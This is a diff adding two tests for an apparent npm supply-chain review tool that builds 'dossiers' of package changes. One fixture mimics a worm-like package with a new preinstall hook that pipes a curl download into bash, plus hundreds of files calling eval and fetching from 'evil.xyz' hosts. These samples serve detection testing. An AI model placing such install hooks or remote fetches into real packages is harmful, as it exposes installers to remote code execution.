@@ -84,6 +84,47 @@ def test_budget_truncates_and_reports():
     assert d.est_tokens <= 500 + 60
 
 
+def test_outside_files_vector_capped_to_10_largest():
+    files = {
+        "package.json": pkg_json("cap", "1.0.0", files=["dist"]),
+        "dist/a.js": "module.exports = 1",
+    }
+    # 15 outside files with distinct, increasing sizes so "largest" is unambiguous.
+    files |= {f"root{i}.js": "x" * (i + 1) * 100 for i in range(15)}
+    d = build_dossier("cap", "cap", "1.0.0", make_pkg(files), None, None)
+    largest_15_to_1 = [f"root{i}.js" for i in range(14, -1, -1)]
+    shown = largest_15_to_1[:10]
+    for name in shown:
+        assert f"added file outside declared `files`: {name}" in d.text
+    for name in largest_15_to_1[10:]:
+        assert f"added file outside declared `files`: {name}" not in d.text
+    assert "and 5 more files outside declared `files`" in d.text
+    # Dossier.outside_files keeps the full, uncapped list.
+    assert len(d.outside_files) == 15
+
+
+def test_w2_like_with_many_outside_files_shows_signal_and_omission_markers():
+    files = {
+        "package.json": pkg_json(
+            "w2big", "1.0.1", files=["dist"], scripts={"preinstall": "node setup_bun.js"}
+        ),
+        "dist/a.js": "module.exports = 1",
+        "setup_bun.js": (
+            "require('child_process').execSync('curl -fsSL https://bun.sh/install | bash')"
+        ),
+    }
+    files |= {f"extra/f{i}.js": f"eval(x{i}); fetch('https://c{i}.evil.xyz')" for i in range(300)}
+    d = build_dossier(
+        "w2big@1.0.1", "w2big", "1.0.1", make_pkg(files), OLD, "1.0.0", budget_tokens=500
+    )
+    assert "- script preinstall: node setup_bun.js  [NEW]" in d.text
+    assert "### setup_bun.js" in d.text
+    assert "curl -fsSL https://bun.sh/install" in d.text
+    assert "[exec]" in d.text or "[network]" in d.text  # at least one pattern line
+    assert "- (" in d.text and "more lines omitted for length)" in d.text
+    assert d.truncated
+
+
 def test_dedup_exec_hits_on_same_line():
     # "child_process" and "execSync(" both match the `exec` pattern on the same source
     # line; the dossier must collapse that into a single hit, not one per sub-match.
